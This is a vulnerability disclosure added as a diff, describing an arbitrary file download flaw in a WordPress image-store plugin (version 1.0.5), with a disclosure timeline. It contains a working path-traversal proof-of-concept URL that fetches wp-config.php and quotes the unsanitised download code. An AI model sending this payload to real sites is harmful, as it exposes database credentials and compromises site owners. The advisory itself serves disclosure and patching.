@@ -1,0 +1,62 @@
+# Exploit Title: WordPress CP Image Store with Slideshow 1.0.5  [Arbitrary file download vulnerability]
+# Date: 2015-07-10
+# Google Dork: 
+# Exploit Author: Joaquin Ramirez Martinez [ i0akiN SEC-LABORATORY ]
+# Vendor Homepage: http://wordpress.dwbooster.com/
+# Software Link: https://downloads.wordpress.org/plugin/cp-image-store.1.0.5.zip
+# Version: 1.0.5
+# Tested on: windows 7 + firefox. 
+
+====================
+ DESCRIPTION
+====================
+
+A vulnerability has been detected in the WordPress CP Image Store with Slideshow plugin in version 1.0.5 .
+The vulnerability allows remote attackers to download arbitrary files from the server.
+The Arbitrary file download vulnerability is located in the `cp-image-store.php` file.
+
+The web vulnerability can be exploited by remote attackers without privileged application user account 
+and without required user interaction. Successful exploitation of the Arbitrary file download vulnerability results 
+in application compromise.
+
+==============
+ POC
+==============
+
+   # http://wp-host/wp-path/?action=cpis_init&cpis-action=f-download&purchase_id=1&cpis_user_email=i0SECLAB@intermal.com&f=../../../../wp-config.php HTTP/1.1
+   
+   the purchase_id parameter can be bruteforced and succesfully exploit this vulnerability.
+
+   
+==================
+ VULNERABLE CODE
+==================
+
+Located in cp-image-store.php
+
+function cpis_download_file(){
+	...
+		
+	if( isset( $_REQUEST[ 'f' ] ) && cpis_check_download_permissions() ){
+		header( 'Content-Type: '.cpis_mime_content_type( basename( $_REQUEST[ 'f' ] ) ) );
+		header( 'Content-Disposition: attachment; filename="'.$_REQUEST[ 'f' ].'"' );
+		if( cpis_checkMemory( array( CPIS_DOWNLOAD.'/'.$_REQUEST[ 'f' ] ) ) ){
+			readfile( CPIS_DOWNLOAD.'/'.$_REQUEST[ 'f' ] );
+		}else{
+			@unlink( CPIS_DOWNLOAD.'/.htaccess');
+			header( 'location:'.CPIS_PLUGIN_URL.'/downloads/'.$_REQUEST[ 'f' ] );
+		}
+	...
+} 
+
+==================================
+
+time-line
+
+2015-07-01: vulnerability found
+2015-07-09: reported to vendor
+2015-07-10: released CP Image Store with Slideshow new version 1.0.6
+2015-07-10: full disclosure
+
+===================================
+
